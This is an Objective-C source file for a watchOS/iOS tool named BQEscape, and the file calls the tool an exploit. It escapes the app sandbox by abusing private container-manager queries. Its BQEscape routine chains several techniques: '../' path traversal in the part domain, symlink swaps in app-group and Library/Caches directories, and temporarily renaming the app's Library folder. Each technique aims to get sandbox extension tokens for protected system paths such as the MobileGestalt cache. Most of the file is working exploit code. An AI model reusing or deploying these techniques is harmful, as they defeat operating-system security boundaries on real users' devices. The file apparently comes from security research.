#include <stdbool.h>
#include <stdint.h>
#import <mach-o/loader.h>
#import "BQCore.h"
#import <dlfcn.h>
#import <zlib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>
#import <dirent.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <stdlib.h>
#import <objc/message.h>
#import <WatchKit/WatchKit.h>
#import <mach-o/dyld.h>
#import <mach-o/getsect.h>


NSString * const BQErrorDomain = @"BQErrorDomain";

static NSString * const kMGGroup = @"systemgroup.com.apple.mobilegestaltcache";
static NSString * const kMGCaches = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
static NSString * const kPBCollections = @"com.apple.WallpaperKit.CollectionsPoster";
static NSString * const kPBCollectionsModern = @"com.apple.Posters.CollectionsPosterApp";
static NSString * const kPBMercury = @"com.apple.MercuryPoster";
static NSString * const kPBPhotos = @"com.apple.PhotosUIPrivate.PhotosPosterProvider";
static NSString * const kPBExtVersion = @"61";

// ---------------------------------------------------------------- logging ---
static NSString *gLogPath;
static NSLock *gLogLock;
static NSString *gGroupRoot;
static NSString *gGroupID;
static NSArray<NSString *> *gGroupIDs;
static NSString *gEscapeGroupRoot;
static int gTraversalState; // 0 unknown, 1 works, -1 unsupported
static BOOL gClass2ParentEnabled;
static NSString *gClass2SubpathLink;
static dispatch_queue_t gWorkQueue;

BOOL BQClass2ParentEnabled(void) { return gClass2ParentEnabled; }

void BQSetClass2ParentEnabled(BOOL on) {
    gClass2ParentEnabled = on;
    [[NSUserDefaults standardUserDefaults] setBool:on forKey:@"BQClass2ParentEnabled"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    BQLog(@"class2-parent enabled=%d", on);
}

NSString *BQLogPath(void) {
    if (!gLogPath) {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        gLogPath = [docs stringByAppendingPathComponent:@"bqtool.log"];
    }
    return gLogPath;
}

void BQLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[bqtool] %@", s);
    static dispatch_once_t once;
    dispatch_once(&once, ^{ gLogLock = [NSLock new]; });
    [gLogLock lock];
    NSString *path = BQLogPath();
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) [fm createFileAtPath:path contents:nil attributes:nil];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            [fh synchronizeFile];
        } @catch (__unused NSException *e) {}
        [fh closeFile];
    }
    [gLogLock unlock];
}

NSString *BQDocuments(void) {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}

NSString *BQGroupID(void) {
    if (!gGroupID) {
        // Read the app's own entitlements via SecTask. This lets the exploit use
        // whatever app group the running build actually has, instead of a
        // hardcoded identifier.
        void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
        typedef CFTypeRef (*create_fn)(CFAllocatorRef);
        typedef CFTypeRef (*copy_ent_fn)(CFTypeRef, CFStringRef, CFErrorRef *);
        create_fn create = (create_fn)dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        if (!create && sec) create = (create_fn)dlsym(sec, "SecTaskCreateFromSelf");
        copy_ent_fn copy = (copy_ent_fn)dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
        if (!copy && sec) copy = (copy_ent_fn)dlsym(sec, "SecTaskCopyValueForEntitlement");
        if (create && copy) {
            CFTypeRef task = create(kCFAllocatorDefault);
            if (task) {
                CFTypeRef val = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
                if (val) {
                    if (CFGetTypeID(val) == CFArrayGetTypeID()) {
                        CFArrayRef arr = (CFArrayRef)val;
                        NSMutableArray *all = [NSMutableArray array];
                        for (CFIndex i = 0; i < CFArrayGetCount(arr); i++) {
                            CFTypeRef x = CFArrayGetValueAtIndex(arr, i);
                            if (x && CFGetTypeID(x) == CFStringGetTypeID()) {
                                [all addObject:[(__bridge NSString *)x copy]];
                            }
                        }
                        if (all.count) {
                            gGroupIDs = [all copy];
                            gGroupID = all.firstObject;
                        }
                    } else if (CFGetTypeID(val) == CFStringGetTypeID()) {
                        NSString *s = [(__bridge NSString *)val copy];
                        if (s.length) {
                            gGroupIDs = @[s];
                            gGroupID = s;
                        }
                    }
                    CFRelease(val);
                }
                CFRelease(task);
            }
        }
        if (!gGroupID) {
            NSString *defaultGroup = [NSString stringWithFormat:@"group.%@", [[NSBundle mainBundle] bundleIdentifier]];
            if ([[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:defaultGroup]) {
                gGroupID = defaultGroup;
                gGroupIDs = @[defaultGroup];
            } else if ([[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.com.kamui.escape"]) {
                gGroupID = @"group.com.kamui.escape";
                gGroupIDs = @[@"group.com.kamui.escape"];
            }
        }
        BQLog(@"app group entitlement: %@", gGroupID ?: @"(none)");
    }
    return gGroupID;
}

NSString *BQGroupRoot(void) {
    if (!gGroupRoot) {
        NSString *group = BQGroupID();
        if (group.length) {
            NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
            gGroupRoot = u.path;
        }
    }
    return gGroupRoot;
}

NSArray<NSString *> *BQGroupIDs(void) {
    BQGroupID();
    return gGroupIDs ?: @[];
}

dispatch_queue_t BQWorkQueue(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gWorkQueue = dispatch_queue_create("com.bqtool.work", DISPATCH_QUEUE_SERIAL);
    });
    return gWorkQueue;
}

// --------------------------------------------------------------- MCM API ---
#if __has_include(<xpc/xpc.h>)
#import <xpc/xpc.h>
#else
typedef void *xpc_object_t;
#endif
typedef xpc_object_t (*xpc_string_create_fn)(const char *);
typedef void (*xpc_release_fn)(xpc_object_t);
typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, xpc_object_t);
typedef void (*fn_set_cstr)(void *, const char *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_str)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_err)(void *);
typedef const char *(*fn_err_msg)(void *);
typedef int (*fn_err_int)(void *);

typedef struct {
    void *h;
    fn_create create;
    fn_set_u64 set_class;
    fn_set_obj set_ids;
    fn_set_obj set_group_ids;
    fn_set_u64 set_flags;
    fn_set_u64 set_part;
    fn_set_cstr set_domain;
    fn_get_one get_one;
    fn_copy_str copy_token;
    fn_get_path get_path;
    fn_free query_free;
    fn_consume consume;
    fn_release release;
    fn_err last_error;
    fn_err_msg err_message;
    fn_err_int err_posix;
} mcm_t;

static mcm_t g;
static xpc_string_create_fn p_xpc_string_create;
static xpc_release_fn p_xpc_release;

static void *bq_sym(void *h, const char *a, const char *b) {
    void *p = dlsym(h, a);
    if (!p && b) p = dlsym(h, b);
    return p;
}

static void bq_load_mcm(void) {
    if (g.create) return;
    memset(&g, 0, sizeof(g));
    g.h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!g.h) {
        BQLog(@"dlopen MCM failed: %s", dlerror());
        return;
    }
    g.create = (fn_create)bq_sym(g.h, "container_query_create", NULL);
    g.set_class = (fn_set_u64)bq_sym(g.h, "container_query_set_class", NULL);
    g.set_ids = (fn_set_obj)bq_sym(g.h, "container_query_set_identifiers", NULL);
    g.set_group_ids = (fn_set_obj)bq_sym(g.h, "container_query_set_group_identifiers", NULL);
    g.set_flags = (fn_set_u64)bq_sym(g.h, "container_query_operation_set_flags", "container_query_set_flags");
    g.set_part = (fn_set_u64)bq_sym(g.h, "container_query_operation_set_part", "container_query_set_part");
    g.set_domain = (fn_set_cstr)bq_sym(g.h, "container_query_operation_set_part_domain", "container_query_set_part_domain");
    g.get_one = (fn_get_one)bq_sym(g.h, "container_query_get_single_result", NULL);
    g.copy_token = (fn_copy_str)bq_sym(g.h, "container_copy_sandbox_token", NULL);
    g.get_path = (fn_get_path)bq_sym(g.h, "container_object_get_path", NULL);
    g.query_free = (fn_free)bq_sym(g.h, "container_query_free", NULL);
    g.consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    g.release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    g.last_error = (fn_err)bq_sym(g.h, "container_query_get_last_error", NULL);
    g.err_message = (fn_err_msg)bq_sym(g.h, "container_error_get_message", NULL);
    g.err_posix = (fn_err_int)bq_sym(g.h, "container_error_get_posix_errno", NULL);
    p_xpc_string_create = (xpc_string_create_fn)dlsym(RTLD_DEFAULT, "xpc_string_create");
    p_xpc_release = (xpc_release_fn)dlsym(RTLD_DEFAULT, "xpc_release");
    BQLog(@"MCM loaded=%d create=%p get=%p token=%p consume=%p release=%p",
          g.h != NULL, g.create, g.get_one, g.copy_token, g.consume, g.release);
}

static void bq_log_query_error(void *q, NSString *where) {
    if (!q || !g.last_error) return;
    void *e = g.last_error(q);
    if (!e) return;
    int posix = g.err_posix ? g.err_posix(e) : 0;
    const char *msg = g.err_message ? g.err_message(e) : NULL;
    BQLog(@"%@: last_error posix=%d msg=%s", where, posix, msg ? msg : "(null)");
}

// ---------------------------------------------------------- fs primitives ---
static void bq_recover(NSString *path, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:bak]) return;
    [fm removeItemAtPath:path error:nil];
    NSError *e = nil;
    if (![fm moveItemAtPath:bak toPath:path error:&e]) {
        BQLog(@"recover %@ -> %@ failed: %@", bak, path, e);
    }
}

static BOOL bq_swap_path(NSString *path, NSString *target, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:bak error:nil];
    if ([fm fileExistsAtPath:path]) {
        NSError *e = nil;
        if (![fm moveItemAtPath:path toPath:bak error:&e]) {
            BQLog(@"swap move %@ -> %@ failed: %@", path, bak, e);
            return NO;
        }
    }
    unlink(path.fileSystemRepresentation);
    errno = 0;
    int r = symlink(target.fileSystemRepresentation, path.fileSystemRepresentation);
    if (r != 0) {
        BQLog(@"symlink %@ -> %@ failed errno=%d (%s)", path, target, errno, strerror(errno));
        if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:path error:nil];
        return NO;
    }
    return YES;
}

static void bq_restore_path(NSString *path, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:bak]) {
        [fm removeItemAtPath:path error:nil];
        NSError *e = nil;
        if (![fm moveItemAtPath:bak toPath:path error:&e]) {
            BQLog(@"restore %@ -> %@ failed: %@", bak, path, e);
        }
    } else {
        if ([fm fileExistsAtPath:path]) {
            struct stat st;
            if (lstat(path.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode)) {
                [fm removeItemAtPath:path error:nil];
            }
        }
        if (![fm fileExistsAtPath:path]) {
            [fm createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
        }
    }
}

// bad_query_list-style inode enumeration.
static char *bq_list(const char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;
    size_t cap = 65536, length = 0, path_length = strlen(path);
    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';
    char buf[1200];
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;
        size_t need = strlen(p) + 2;
        if (length + need > cap) {
            cap *= 2;
            char *t = realloc(out, cap);
            if (!t) break;
            out = t;
        }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}

// ------------------------------------------------------------------ init ---
BOOL BQCoreInit(void) {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        NSString *docs = BQDocuments();
        [[NSFileManager defaultManager] createDirectoryAtPath:[docs stringByAppendingPathComponent:@"tendies"]
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        [[NSFileManager defaultManager] createDirectoryAtPath:[docs stringByAppendingPathComponent:@"PosterBoard/Wallpapers"]
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        if (gLogPath) [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];
        NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
        gClass2ParentEnabled = [defs boolForKey:@"BQClass2ParentEnabled"];
        if (gClass2ParentEnabled && [defs boolForKey:@"BQClass2ParentCrashGuard"]) {
            gClass2ParentEnabled = NO;
            [defs setBool:NO forKey:@"BQClass2ParentEnabled"];
            [defs setBool:NO forKey:@"BQClass2ParentCrashGuard"];
            [defs synchronize];
            BQLog(@"class2-parent disabled after a previous attempt did not finish");
        } else if (gClass2ParentEnabled) {
            [defs setBool:YES forKey:@"BQClass2ParentCrashGuard"];
            [defs synchronize];
        } else {
            [defs setBool:NO forKey:@"BQClass2ParentCrashGuard"];
        }
        BQLog(@"=== BQEscape start | iOS %@ | bundle %@ ===",
              [WKInterfaceDevice currentDevice].systemVersion, [[NSBundle mainBundle] bundleIdentifier]);
        bq_load_mcm();
        NSString *gid = BQGroupID();
        NSString *root = BQGroupRoot();
        BQLog(@"app group: id=%@ root=%@", gid ?: @"(none)", root ?: @"(none)");
        ok = (g.create && g.get_one && g.copy_token && g.consume && g.release);
        BQLog(@"core init ok=%d", ok);
    });
    return ok;
}

// ---------------------------------------------------------------- escape ---
static NSString *bq_dots(int n) {
    NSMutableArray *a = [NSMutableArray array];
    for (int i = 0; i < n; i++) [a addObject:@".."];
    return [a componentsJoinedByString:@"/"];
}

static int64_t bq_query_escape(uint64_t cls, NSString *ident, BOOL group,
                               uint64_t part, NSString *domain, uint64_t flags,
                               NSString *label, NSString **outPath) {
    if (!g.create || !ident.length) return -1;
    void *q = g.create();
    if (!q) return -2;
    g.set_class(q, cls);
    xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
    if (group && g.set_group_ids) g.set_group_ids(q, x);
    else if (g.set_ids) g.set_ids(q, x);
    else if (g.set_group_ids) g.set_group_ids(q, x);
    if (g.set_part) g.set_part(q, part);
    if (domain.length && g.set_domain) g.set_domain(q, domain.UTF8String);
    if (g.set_flags) g.set_flags(q, flags);
    if (x && p_xpc_release) p_xpc_release(x);

    void *res = g.get_one(q);
    NSString *path = nil;
    if (res && g.get_path) {
        const char *cp = g.get_path(res);
        if (cp) path = [NSString stringWithUTF8String:cp];
    }
    char *tok = (res && g.copy_token) ? g.copy_token(res) : NULL;
    int64_t h = (tok && g.consume) ? g.consume(tok) : -5;
    BQLog(@"strategy %@: cls=%llu ident=%@ part=%llu result=%p path=%@ token=%s consume=%lld",
          label, cls, ident, part, res, path ?: @"(null)", tok ? "YES" : "NO", (long long)h);
    // HermesEnabler safe MG access diagnostics v2: add failure context.
    if (!res || !tok) bq_log_query_error(q, label);
    if (res && !tok) {
        BQLog(@"MCM_DIAGNOSTIC: container result present but no sandbox token for %@; app-group entitlement does not imply access to the requested target", label);
    }
    if (tok) free(tok);
    g.query_free(q);
    if (h >= 0 && outPath) *outPath = path;
    return h;
}

// Class 2 (the app's own data container) has one more door: the sandbox
// refuses to rename the part directories themselves (Library/Caches, Documents,
// tmp, ...), but the parent Library directory can be renamed on some builds.
// Move it aside, recreate a small Library with a symlinked Caches, query class 2
// and restore the original Library immediately. The token remains valid for the
// resolved target.
// Class 2 subpath symlink: create a symlink inside the app's own
// Library/Caches and ask MCM for part 3 with a non-empty partDomain. This
// keeps Library in place (no process-killing rename) and may make the daemon
// resolve the symlink while issuing the extension. Safe to attempt: only a
// temporary symlink inside Caches is touched.
static int64_t bq_escape_class2_subpath(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;
    if (!g.set_domain) return -1;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *leaf = [NSString stringWithFormat:@".bq_link_%d", getpid()];
    NSString *link = [caches stringByAppendingPathComponent:leaf];
    unlink(link.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
        BQLog(@"class2-subpath: symlink failed errno=%d (%s)", errno, strerror(errno));
        return -2;
    }

    NSArray *domains = @[
        leaf,
        [@"Caches/" stringByAppendingString:leaf],
        [@"Library/Caches/" stringByAppendingString:leaf],
    ];
    int64_t last = -1;
    for (NSString *domain in domains) {
        NSString *path = nil;
        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8100000000ULL,
                                    [@"class2-subpath-" stringByAppendingString:domain], &path);
        if (h >= 0) {
            // A token for the symlink path is not enough: the editor needs the
            // resolved target. Verify before reporting success.
            DIR *d = opendir(target.fileSystemRepresentation);
            if (!d) {
                BQLog(@"class2-subpath: token did not open target (%@)", path ?: @"(null)");
                if (g.release) g.release(h);
                last = -5;
                continue;
            }
            closedir(d);
            unlink(link.fileSystemRepresentation);
            if (linkOut) *linkOut = target;
            BQLog(@"escape: using class2 subpath (%@) path=%@", domain, path ?: @"(null)");
            return h;
        }
        last = h;
    }
    unlink(link.fileSystemRepresentation);
    return last;
}

// Class 2 staged symlink: put a tiny fake tree inside the app's own
// Library/Caches, then use partDomain so MCM appends "Library/Caches" behind a
// symlink that resolves to the target. No Library move and no app group.
static int64_t bq_escape_class2_stage(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length || !g.set_domain) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *tag = [NSString stringWithFormat:@".bq_stage_%d", getpid()];
    NSString *stage = [caches stringByAppendingPathComponent:tag];
    NSString *link = [caches stringByAppendingPathComponent:
                      [NSString stringWithFormat:@".bq_slink_%d", getpid()]];
    NSString *stageLib = [stage stringByAppendingPathComponent:@"Library"];
    NSString *stageCaches = [stageLib stringByAppendingPathComponent:@"Caches"];

    [fm removeItemAtPath:stage error:nil];
    unlink(link.fileSystemRepresentation);
    if (![fm createDirectoryAtPath:stageLib withIntermediateDirectories:YES attributes:nil error:nil]) return -2;
    if (symlink(target.fileSystemRepresentation, stageCaches.fileSystemRepresentation) != 0) {
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }
    if (symlink(stage.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
        unlink(stageCaches.fileSystemRepresentation);
        [fm removeItemAtPath:stage error:nil];
        return -2;
    }

    NSArray *domains = @[
        [@"Library/Caches/" stringByAppendingString:link.lastPathComponent],
        [@"Caches/" stringByAppendingString:link.lastPathComponent],
        link.lastPathComponent,
    ];
    int64_t last = -1;
    for (NSString *domain in domains) {
        NSString *path = nil;
        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8100000000ULL,
                                    [@"class2-stage-" stringByAppendingString:domain], &path);
        if (h >= 0) {
            DIR *d = opendir(target.fileSystemRepresentation);
            if (!d) {
                BQLog(@"class2-stage: token did not open target (%@)", path ?: @"(null)");
                if (g.release) g.release(h);
                last = -5;
                continue;
            }
            closedir(d);
            unlink(link.fileSystemRepresentation);
            unlink(stageCaches.fileSystemRepresentation);
            rmdir(stageLib.fileSystemRepresentation);
            rmdir(stage.fileSystemRepresentation);
            if (linkOut) *linkOut = target;
            BQLog(@"escape: using class2 stage (%@) path=%@", domain, path ?: @"(null)");
            return h;
        }
        last = h;
    }
    unlink(link.fileSystemRepresentation);
    unlink(stageCaches.fileSystemRepresentation);
    rmdir(stageLib.fileSystemRepresentation);
    rmdir(stage.fileSystemRepresentation);
    return last;
}

static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *bak = [home stringByAppendingPathComponent:@"Library.bqtool"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];

    // Recover an interrupted attempt. A stale backup is only safe to restore
    // when the live Library is missing or is our temporary Caches symlink.
    if ([fm fileExistsAtPath:bak]) {
        struct stat st;
        BOOL temp = ([fm fileExistsAtPath:lib] &&
                     lstat(caches.fileSystemRepresentation, &st) == 0 &&
                     S_ISLNK(st.st_mode));
        if (temp || ![fm fileExistsAtPath:lib]) {
            bq_restore_path(lib, bak);
        } else {
            BQLog(@"class2-parent: stale %@ exists; refusing to touch %@", bak, lib);
            return -2;
        }
    }
    if (![fm fileExistsAtPath:lib]) return -2;

    NSError *e = nil;
    if (![fm moveItemAtPath:lib toPath:bak error:&e]) {
        BQLog(@"class2-parent: move Library -> bak failed: %@", e);
        return -2;
    }
    if (![fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:&e]) {
        BQLog(@"class2-parent: recreate Library failed: %@", e);
        [fm moveItemAtPath:bak toPath:lib error:nil];
        return -2;
    }
    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) != 0) {
        BQLog(@"class2-parent: symlink Caches failed errno=%d (%s)", errno, strerror(errno));
        bq_restore_path(lib, bak);
        return -2;
    }

    NSString *path = nil;
    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8100000000ULL,
                                @"class2-parent", &path);
    // Restore the real Library before returning. Remove the symlink first so a
    // recursive directory removal can never walk into the target.
    unlink(caches.fileSystemRepresentation);
    rmdir(lib.fileSystemRepresentation);
    NSError *re = nil;
    if (![fm moveItemAtPath:bak toPath:lib error:&re]) {
        BQLog(@"class2-parent: restore Library failed: %@", re);
        bq_restore_path(lib, bak);
    }
    if (h >= 0) {
        DIR *d = opendir(target.fileSystemRepresentation);
        if (!d) {
            BQLog(@"class2-parent: token did not open target");
            if (g.release) g.release(h);
            return -5;
        }
        closedir(d);
        if (linkOut) *linkOut = target;
        BQLog(@"escape: using class2 parent -> %@", target);
        return h;
    }
    return h;
}

static int64_t bq_escape_symlink(NSString *target, NSString **linkOut) {
    NSArray<NSString *> *ids = BQGroupIDs();
    if (!ids.count) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    int64_t last = -6;
    for (NSString *gid in ids) {
        NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
        NSString *groot = u.path;
        if (!groot.length) continue;
        NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
        NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
        NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
        [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
        bq_recover(lib, [groot stringByAppendingPathComponent:@"Library.bq_orig"]);
        bq_recover(caches, bak);
        if (![fm fileExistsAtPath:caches]) {
            [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
        }
        if (!bq_swap_path(caches, target, bak)) {
            bq_restore_path(caches, bak);
            last = -2;
            continue;
        }
        NSString *path = nil;
        int64_t h = bq_query_escape(7, gid, YES, 3, @"", 0x8100000000ULL,
                                    [@"class7-symlink/" stringByAppendingString:gid], &path);
        if (h >= 0) {
            gEscapeGroupRoot = groot;
            if (linkOut) *linkOut = caches;
            return h;
        }
        bq_restore_path(caches, bak);
        last = h;
    }
    return last;
}


// RO23 public snapshot: Class 7 app-group path-swap probe removed.
NSString *BQProbeClass7Flags23U95(void) {
    return @"Historical Class-7 flag probe removed from public research snapshot.";
}

int64_t BQEscape(NSString *target, NSString **linkOut) {
    if (!target.length) return -1;
    bq_load_mcm();
    int64_t last = -1;

    // 1. Old bad_query: class 13 + part-domain traversal. No app group needed.
    //    Works on builds where the traversal is not patched (27.0.x), fails on 27.2.
    if (gTraversalState >= 0 && target.isAbsolutePath) {
        NSString *dom = [bq_dots(12) stringByAppendingString:target];
        NSString *p = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8100000000ULL,
                                    @"class13-traversal", &p);
        if (h >= 0) {
            gTraversalState = 1;
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class13 traversal -> %@", p ?: target);
            return h;
        }
        gTraversalState = -1;
        last = h;
    }

    // 2. App-group part-directory symlink (27.2).
    NSString *gid = BQGroupID();
    if (gid.length) {
        NSString *link = nil;
        int64_t h = bq_escape_symlink(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link;
            BQLog(@"escape: using class7 symlink");
            return h;
        }
        last = h;
    }

    // 3. Class 2 staged symlink: a fake Library/Caches tree inside the app's
    //    Caches, resolved through a partDomain symlink. Safe and no app group.
    {
        NSString *link = nil;
        int64_t h = bq_escape_class2_stage(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 stage");
            return h;
        }
        last = h;
    }

    // 4. Class 2 symlink inside the existing Library/Caches. This is safe and
    //    needs no app group; it only works if MCM follows a relative symlink in
    //    partDomain without rejecting the resolved target.
    {
        NSString *link = nil;
        int64_t h = bq_escape_class2_subpath(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 subpath");
            return h;
        }
        last = h;
    }

    // 5. Class 2 parent-directory symlink. No app group needed: move the app's
    //    Library aside, create Library/Caches -> target, query the app's own
    //    container (class 2), then restore Library. Off by default: some builds
    //    kill the process for moving Library, so this is opt-in from Settings.
    if (gClass2ParentEnabled) {
        NSString *link = nil;
        int64_t h = bq_escape_class2_parent(target, &link);
        [[NSUserDefaults standardUserDefaults] setBool:NO forKey:@"BQClass2ParentCrashGuard"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 parent");
            return h;
        }
        last = h;
    } else {
        BQLog(@"class2-parent disabled (enable in Settings if there is no app group)");
    }

    // 6. Class 13 direct MobileGestalt query (some 27.0.x builds).
    if ([target isEqualToString:kMGCaches]) {
        NSString *p = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8100000000ULL,
                                    @"class13-direct", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class13 direct");
            return h;
        }
        last = h;
    }

    // 7. Class 12 geod part-domain traversal (older builds).
    if (target.isAbsolutePath) {
        NSString *dom = [bq_dots(12) stringByAppendingString:target];
        NSString *p = nil;
        int64_t h = bq_query_escape(12, @"com.apple.geod", NO, 3, dom, 0x8100000000ULL,
                                    @"class12-geod-traversal", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class12 geod traversal");
            return h;
        }
        last = h;
    }

    BQLog(@"escape: all strategies failed (last=%lld) target=%@", (long long)last, target);
    return last;
}

static NSString *bq_escape_error(int64_t h) {
    if (h == -6) {
        return NSLocalizedString(@"no app group — open Settings → Class-2 fallback (experimental), enable it, then retry", nil);
    }
    if (h == -2) {
        return NSLocalizedString(@"class-2 fallback could not move Library — this build needs an app group on 27.2", nil);
    }
    if (h == -5) {
        return NSLocalizedString(@"the MCM query returned no sandbox token — send Documents/bqtool.log", nil);
    }
    return [NSString stringWithFormat:NSLocalizedString(@"escape failed (%lld)", nil), (long long)h];
}

void BQEndEscape(int64_t handle) {
    if (handle >= 0 && g.release) g.release(handle);
    if (gClass2SubpathLink.length) {
        unlink(gClass2SubpathLink.fileSystemRepresentation);
        gClass2SubpathLink = nil;
    }
    NSString *groot = gEscapeGroupRoot;
    gEscapeGroupRoot = nil;
    if (!groot.length) return;
    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
    bq_restore_path(caches, bak);
}
// -------------------------------------------------------------- Gestalt ---
NSString *BQBackupPath(void) {
    return [BQDocuments() stringByAppendingPathComponent:@"OriginalGestalt.plist"];
}

// watchOS 26 compatibility diagnostics (safe)
BOOL BQBackupVerified(void) {
    NSData *data = [NSData dataWithContentsOfFile:BQBackupPath()];
    if (!data.length) return NO;
    id object = [NSPropertyListSerialization propertyListWithData:data
                                                       options:0 format:NULL error:NULL];
    if (![object isKindOfClass:[NSDictionary class]]) return NO;
    NSDictionary *plist = (NSDictionary *)object;
    return [plist[@"CacheData"] isKindOfClass:[NSData class]] &&
           [plist[@"CacheExtra"] isKindOfClass:[NSDictionary class]] &&
           [plist[@"CacheUUID"] isKindOfClass:[NSString class]];
}

BOOL BQBackupExists(void) {
